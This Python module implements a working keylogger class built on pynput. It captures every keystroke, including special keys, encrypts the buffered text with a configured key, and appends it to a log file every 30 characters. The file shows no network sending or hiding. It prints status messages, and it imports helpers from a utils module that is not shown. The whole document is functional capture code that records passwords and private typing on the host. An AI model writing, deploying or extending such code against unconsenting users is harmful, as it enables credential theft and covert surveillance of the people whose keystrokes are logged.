from pynput import keyboard
from .utils import encrypt_data, load_config, get_log_filename
import os
import time

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.is_logging = False
        self.config = load_config()
        self.log_file = None  # Will be set when starting
        
    def on_press(self, key):
        """Callback for key press events"""
        try:
            # Handle special keys
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1] if self.log else ""
            elif key == keyboard.Key.tab:
                self.log += "\t"
            elif hasattr(key, 'char') and key.char:
                # Regular character keys
                self.log += key.char
            else:
                # Other special keys
                self.log += f"[{str(key).replace('Key.', '')}]"
                
        except Exception as e:
            print(f"Error handling key press: {e}")
            
        # Auto-save every 30 characters
        if len(self.log) >= 30:
            self.save_log()
            
    def save_log(self):
        """Save the current log to file with encryption"""
        if self.log:
            try:
                encrypted_data = encrypt_data(self.log, self.config['encryption_key'])
                with open(self.log_file, "ab") as f:
                    f.write(encrypted_data + b"\n")  # Add newline to separate entries
                print(f"Saved {len(self.log)} characters to log")
                self.log = ""  # Clear the log after saving
            except Exception as e:
                print(f"Error saving log: {e}")
    
    def start_logging(self):
        """Start the keylogger"""
        if self.is_logging:
            return False
            
        try:
            # Create a new log file each time we start
            self.log_file = get_log_filename()
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.is_logging = True
            print(f"Keylogging started. Log file: {self.log_file}")
            return True
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            return False
    
    def stop_logging(self):
        """Stop the keylogger and save final log"""
        if not self.is_logging:
            return False
            
        try:
            self.save_log()  # Save any remaining log data
            if self.listener:
                self.listener.stop()
            self.is_logging = False
            print("Keylogging stopped.")
            return True
        except Exception as e:
            print(f"Error stopping keylogger: {e}")
            return False